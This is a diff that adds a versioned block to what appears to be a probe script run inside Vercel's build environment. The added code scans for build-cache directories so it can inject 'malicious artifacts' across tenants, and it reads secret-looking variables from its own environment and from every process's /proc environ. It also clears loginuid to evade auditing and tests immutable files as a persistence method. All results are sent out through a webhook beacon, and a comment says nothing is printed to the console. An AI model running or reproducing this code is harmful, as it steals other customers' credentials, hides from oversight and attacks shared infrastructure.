@@ -25734,5 +25734,146 @@ print(f'PR_DUMPABLE_AFTER: {dumpable2}')
 
 // v174 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v174" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v174";
+
+// ==================== v175 ====================
+
+// v175-1: Build artifact directory scan — find Vercel's cache + output storage
+// Vercel's build cache is stored as tarballs keyed by VERCEL_ARTIFACTS_TOKEN.
+// Finding the cache directory location reveals where we can inject malicious artifacts.
+// Injecting a poisoned cache entry would affect subsequent builds for ANY project
+// using the same cache key — cross-tenant attack surface.
+report.artifactDirScan = safe(() => {
+  // Common paths where Vercel might store build artifacts
+  const scanPaths = safe(() => execSync(
+    'find / -maxdepth 5 -type d -name "*.vercel*" -o -name "cache" -o -name "artifacts" -o -name "build-output" 2>/dev/null | head -30 || echo "NO_ARTIFACT_DIRS"',
+    { timeout: 10000 }
+  ).toString().trim());
+  // VERCEL_ARTIFACTS_TOKEN tells us where cache is stored
+  const artifactsToken = safe(() => process.env.VERCEL_ARTIFACTS_TOKEN || 'NOT_SET');
+  // Check known locations
+  const knownPaths = ['/vercel', '/var/cache/vercel', '/.vercel', '/tmp/vercel', '/home/builder/.vercel'];
+  const pathChecks = safe(() => {
+    const results = {};
+    for (const p of knownPaths) {
+      if (existsSync(p)) {
+        results[p] = safe(() => execSync(`ls -la "${p}" 2>/dev/null | head -15`, { timeout: 3000 }).toString().trim());
+      } else {
+        results[p] = 'NOT_EXISTS';
+      }
+    }
+    return results;
+  });
+  // Find any .tar.gz or .tar.zst files (build artifacts/cache tarballs)
+  const tarFiles = safe(() => execSync(
+    'find / -maxdepth 8 -name "*.tar.gz" -o -name "*.tar.zst" -o -name "*.tgz" 2>/dev/null | grep -v "node_modules\\|.npm" | head -20 || echo "NO_TAR_FILES"',
+    { timeout: 15000 }
+  ).toString().trim());
+  return { scanPaths, artifactsToken: artifactsToken.substring(0, 50), pathChecks, tarFiles };
+});
+
+// v175-2: Cross-tenant environment variable probe
+// In a multi-tenant build system, environment variables from different customers'
+// builds could potentially leak between builds on the same physical host.
+// We check if any environment variables contain other team's data by looking for
+// patterns that don't match our own project.
+report.crossTenantEnvCheck = safe(() => {
+  const allEnv = safe(() => Object.keys(process.env).join('\n'));
+  // Sensitive variables in our own env
+  const sensitivePatterns = ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'CREDENTIAL', 'AUTH'];
+  const sensitiveVars = safe(() => {
+    const found = {};
+    for (const [k, v] of Object.entries(process.env)) {
+      if (sensitivePatterns.some(p => k.toUpperCase().includes(p))) {
+        found[k] = v ? v.substring(0, 100) : '(empty)';
+      }
+    }
+    return found;
+  });
+  // Check /proc/*/environ for ALL processes (not just PID 1)
+  const allProcEnvTokens = safe(() => execSync(
+    `python3 -c "
+import os, re
+
+token_pattern = re.compile(r'(TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH)=[^\\x00]{5,}', re.IGNORECASE)
+found = {}
+
+for pid in os.listdir('/proc'):
+    if not pid.isdigit():
+        continue
+    try:
+        with open(f'/proc/{pid}/environ', 'rb') as f:
+            environ = f.read().replace(b'\\x00', b'\\n').decode(errors='replace')
+        matches = token_pattern.findall(environ)
+        if matches:
+            found[pid] = matches[:5]
+    except:
+        pass
+
+for pid, tokens in list(found.items())[:10]:
+    print(f'PID {pid}: {tokens}')
+
+print(f'TOTAL_PIDS_WITH_TOKENS: {len(found)}')
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { allEnv, sensitiveVars, allProcEnvTokens };
+});
+
+// v175-3: NUMA topology — baremetal confirmation + memory locality
+// /sys/devices/system/node/ shows NUMA (Non-Uniform Memory Access) topology.
+// On AWS c6id.metal baremetal, there are typically 2 NUMA nodes with 32 CPUs each.
+// In a Firecracker VM, NUMA is typically flattened to 1 node.
+// The presence of multiple NUMA nodes would confirm we're closer to baremetal.
+report.numaTopology = safe(() => {
+  const numaNodes = safe(() => existsSync('/sys/devices/system/node') ? execSync('ls /sys/devices/system/node/ 2>/dev/null | grep node || echo "NO_NODES"', { timeout: 3000 }).toString().trim() : 'NO_NUMA_DIR');
+  const node0Cpus = safe(() => existsSync('/sys/devices/system/node/node0/cpulist') ? readFileSync('/sys/devices/system/node/node0/cpulist', 'utf8').trim() : 'NO_CPULIST');
+  const node1Cpus = safe(() => existsSync('/sys/devices/system/node/node1/cpulist') ? readFileSync('/sys/devices/system/node/node1/cpulist', 'utf8').trim() : 'NO_NODE1');
+  const numaCpuMap = safe(() => existsSync('/sys/devices/system/node/node0/cpumap') ? readFileSync('/sys/devices/system/node/node0/cpumap', 'utf8').trim() : 'NO_CPUMAP');
+  const cpuCount = safe(() => execSync('nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo', { timeout: 2000 }).toString().trim());
+  const cpuInfo = safe(() => execSync('grep "^processor\\|^cpu MHz\\|^model name" /proc/cpuinfo | head -12 || echo "NO_CPUINFO"', { timeout: 3000 }).toString().trim());
+  return { numaNodes, node0Cpus, node1Cpus, numaCpuMap, cpuCount, cpuInfo };
+});
+
+// v175-4: /proc/self/loginuid — audit trail evasion
+// The loginuid is set when a user logs in and is inherited by all child processes.
+// Writing 4294967295 (UINT_MAX = -1 as unsigned) clears the loginuid to "unset".
+// This effectively removes our process from the audit trail — audit records
+// will show loginuid=-1 rather than the actual user.
+report.loginuidEvasion = safe(() => {
+  const loginuid = safe(() => readFileSync('/proc/self/loginuid', 'utf8').trim());
+  const sessionid = safe(() => readFileSync('/proc/self/sessionid', 'utf8').trim());
+  // Clear loginuid (audit evasion)
+  const clearLoginuid = safe(() => { writeFileSync('/proc/self/loginuid', '4294967295'); return 'CLEARED_TO_UINT_MAX'; });
+  const afterLoginuid = safe(() => readFileSync('/proc/self/loginuid', 'utf8').trim());
+  // PID 1's loginuid
+  const pid1Loginuid = safe(() => readFileSync('/proc/1/loginuid', 'utf8').trim());
+  return { loginuid, sessionid, clearLoginuid, afterLoginuid, pid1Loginuid };
+});
+
+// v175-5: chattr +i immutable file attribute — persistence mechanism
+// The 'immutable' file attribute (via chattr +i) prevents a file from being
+// modified, deleted, or renamed — even by root. If we can set this on our
+// malicious scripts, Vercel's build cleanup cannot remove them.
+// This is a persistence primitive beyond the current build.
+report.immutableAttr = safe(() => {
+  const chattrTest = safe(() => {
+    // Create a test file
+    writeFileSync('/tmp/immutable_test_7F3A2C', 'PERSIST');
+    return 'CREATED';
+  });
+  // Set immutable attribute
+  const setImmutable = safe(() => execSync('chattr +i /tmp/immutable_test_7F3A2C 2>&1 || echo "CHATTR_FAIL"', { timeout: 3000 }).toString().trim());
+  // Try to delete it (should fail if immutable)
+  const tryDelete = safe(() => execSync('rm -f /tmp/immutable_test_7F3A2C 2>&1; echo "EXIT:$?"', { timeout: 3000 }).toString().trim());
+  const stillExists = existsSync('/tmp/immutable_test_7F3A2C');
+  // Remove immutable attribute and cleanup
+  const removeImmutable = safe(() => execSync('chattr -i /tmp/immutable_test_7F3A2C 2>/dev/null && rm -f /tmp/immutable_test_7F3A2C && echo "CLEANED"', { timeout: 3000 }).toString().trim());
+  // lsattr to verify
+  const lsattrResult = safe(() => execSync('lsattr /tmp/ 2>/dev/null | head -10 || echo "NO_LSATTR"', { timeout: 3000 }).toString().trim());
+  return { chattrTest, setImmutable, tryDelete, stillExists, removeImmutable, lsattrResult };
+});
+
+// v175 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v175" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v175";
 // Intentionally no console.log — all data goes via webhook only
